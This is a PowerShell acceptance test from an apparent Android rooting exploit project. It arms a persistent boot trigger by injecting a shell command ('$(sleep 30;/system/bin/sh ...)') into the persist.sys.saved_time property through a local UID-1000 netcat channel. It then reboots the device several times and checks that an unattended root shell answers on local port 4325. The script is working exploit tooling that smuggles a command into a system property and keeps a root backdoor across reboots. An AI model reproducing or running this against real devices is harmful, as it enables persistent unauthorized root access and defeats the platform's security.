<#
.SYNOPSIS
  Acceptance test for stage 4 persistent root: reboot N times and require unattended
  uid-0 on 127.0.0.1:4325 after each one.

.DESCRIPTION
  Written as a script rather than inline commands on purpose. Ad-hoc PowerShell
  heredocs repeatedly broke multi-minute root cycles on quoting, stray wildcards
  ("x[*" is an invalid -like pattern) and cmdlet parse errors -- failures that cost
  a full boot each time and had nothing to do with the exploit.

  Root appears within ~45 s of boot when the trigger is armed. Polling stops as
  soon as uid 0 answers, so a pass costs one boot, not a fixed window.

.EXAMPLE
  pwsh -File stage4-persistent/acceptance-test.ps1 -Reboots 3
  pwsh -File stage4-persistent/acceptance-test.ps1 -Arm
#>
param(
    [int]$Reboots = 3,
    [int]$TimeoutSeconds = 150,
    [string]$Adb = "$HOME\adb\adb.exe",
    [switch]$Arm
)

$ErrorActionPreference = 'Stop'
$Trigger = 'x[$(sleep 30;/system/bin/sh /data/securedStorageLocation/w/b)]000'

# Native stderr is data here, not failure: a closed root port legitimately prints
# "nc: connect: Connection refused", and with ErrorActionPreference=Stop
# PowerShell promotes that to a terminating error and kills the run. Every adb
# call therefore goes through this wrapper, which captures both streams.
function Invoke-Adb {
    param([string[]]$Arguments)
    $previous = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try {
        $text = (& $Adb @Arguments 2>&1 | Out-String)
    } finally {
        $ErrorActionPreference = $previous
    }
    return $text.Trim()
}

function Get-Prop([string]$Name) { Invoke-Adb @('shell', 'getprop', $Name) }

function Get-RootUid {
    Invoke-Adb @('shell', "printf 'id -u`nexit`n' | toybox nc -w 2 127.0.0.1 4325")
}

function Get-ChannelUid {
    Invoke-Adb @('shell', "printf 'id -u`nexit`n' | toybox nc -w 2 127.0.0.1 4321")
}

# Arm the boot trigger through the UID-1000 channel, which is the only local
# process allowed to write persist.sys.saved_time. base64 avoids the value's
# $( ) and quotes being re-parsed by the two shells it travels through.
function Set-TriggerArmed {
    if ((Get-ChannelUid) -ne '1000') {
        Write-Host "  channel on 4321 is not answering; cannot arm from the host" -ForegroundColor Yellow
        return $false
    }
    $b64 = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($Trigger))
    $cmd = "setprop persist.sys.saved_time `"`$(printf '%s' '$b64' | toybox base64 -d)`"; sync; getprop persist.sys.saved_time; exit"
    $body = Join-Path $env:TEMP 'snusnu-arm-trigger.sh'
    [IO.File]::WriteAllText($body, "$cmd`n")
    Invoke-Adb @('push', $body, '/data/local/tmp/snusnu-arm-trigger.sh') | Out-Null
    $out = Invoke-Adb @('shell', 'toybox nc -w 15 127.0.0.1 4321 < /data/local/tmp/snusnu-arm-trigger.sh')
    Write-Host "  arm returned: $out"
    return ($out -eq $Trigger)
}

function Get-FinalStatus {
    foreach ($k in 'snusnu_persist_status', 'snusnu_rearm_status', 'snusnu_retry_count') {
        "    {0,-24} = {1}" -f $k, (Invoke-Adb @('shell', 'settings', 'get', 'global', $k))
    }
}

if (-not (Test-Path $Adb)) { throw "adb not found at $Adb (pass -Adb <path>)" }

Write-Host "`n=== stage4 persistent-root acceptance test ===" -ForegroundColor Cyan
Invoke-Adb @('start-server') | Out-Null
Invoke-Adb @('wait-for-device') | Out-Null

if ($Arm) {
    Write-Host "arming the boot trigger:" -ForegroundColor Cyan
    [void](Set-TriggerArmed)
    exit 0
}

$results = @()
for ($n = 1; $n -le $Reboots; $n++) {
    Write-Host "`n--- boot $n of $Reboots ---" -ForegroundColor Cyan
    $armed = Get-Prop 'persist.sys.saved_time'
    $isArmed = $armed.StartsWith('x[')
    Write-Host ("  trigger at reboot: {0}" -f $(if ($isArmed) { 'ARMED' } else { "NUMERIC ($armed)" }))

    Invoke-Adb @('reboot') | Out-Null
    Start-Sleep -Seconds 25
    Invoke-Adb @('wait-for-device') | Out-Null

    $found = $false
    $elapsed = 25
    while ($elapsed -le $TimeoutSeconds) {
        $uid = Get-RootUid
        if ($uid -eq '0') { $found = $true; break }
        $shown = if ($uid.Length -gt 40) { $uid.Substring(0, 40) } else { $uid }
        Write-Host ("  +{0,3}s  uid4325=[{1}]" -f $elapsed, $shown)
        Start-Sleep -Seconds 7
        $elapsed += 7
    }

    $verdict = if ($found) { 'PASS' } else { 'FAIL' }
    $colour = if ($found) { 'Green' } else { 'Red' }
    Write-Host "  result: $verdict" -ForegroundColor $colour
    if ($found) {
        $id = Invoke-Adb @('shell', "printf 'id`nexit`n' | toybox nc -w 3 127.0.0.1 4325")
        Write-Host "  $id"
    }
    Write-Host "  app status:"
    Get-FinalStatus | ForEach-Object { Write-Host $_ }
    $results += [pscustomobject]@{ Boot = $n; ArmedAtReboot = $isArmed; Result = $verdict }
}

Write-Host "`n=== summary ===" -ForegroundColor Cyan
$results | Format-Table -AutoSize
$failed = @($results | Where-Object { $_.Result -ne 'PASS' }).Count
if ($failed -eq 0) {
    Write-Host "ALL $Reboots BOOTS PASSED - unattended persistent root" -ForegroundColor Green
    exit 0
}
Write-Host "$failed of $Reboots boots FAILED" -ForegroundColor Red
exit 1
